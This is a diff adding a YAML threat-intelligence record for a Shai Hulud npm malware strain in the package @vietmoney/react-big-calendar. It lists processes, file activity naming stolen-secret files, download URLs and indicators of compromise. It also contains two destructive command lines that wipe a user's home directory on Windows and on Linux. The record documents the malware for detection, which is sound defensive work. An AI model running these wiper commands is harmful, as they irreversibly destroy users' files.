@@ -1,0 +1,41 @@
+description: New strain of Shai Hulud uploaded to npm in the package @vietmoney/react-big-calendar
+  with obfuscated code and intentional mistakes.
+malware_families:
+- Shai Hulud
+TTPs:
+  processes:
+  - cmd.exe
+  - bash
+  commandline:
+  - cmd.exe /c del /F /Q /S "%USERPROFILE%*" && for /d %%i in ("%USERPROFILE%*") do rd /S /Q "%%i" & cipher /W:%USERPROFILE%
+  - bash -c "find \"$HOME\" -type f -writable -user \"$(id -un)\" -print | xargs -6 -r-uvz -n 1 && find \"$HOME\" -depth -type d -empty -delete"
+  scripting_engine:
+  - JavaScript
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - bun_installer.js, https://raw.githubusercontent.com/, 443
+  - environment_source.js, https://raw.githubusercontent.com/, 443
+  file_activity:
+  - bun_installer.js
+  - environment_source.js
+  - 3nvir0nm3nt.json
+  - cl0vd.json
+  - c9nt3nts.json
+  - pigS3cr3ts.json
+  - actionsSecrets.json
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - raw.githubusercontent.com
+  urls:
+  - https://www.npmjs.com/package/@vietmoney/react-big-calendar
+  - https://raw.githubusercontent.com/
+authors:
+- Charlie Eriksen
+reference: https://www.aikido.dev/blog/shai-hulud-strikes-again---the-golden-path
+date_of_publication: December 28, 2025
+file_creation_date: February 21, 2026
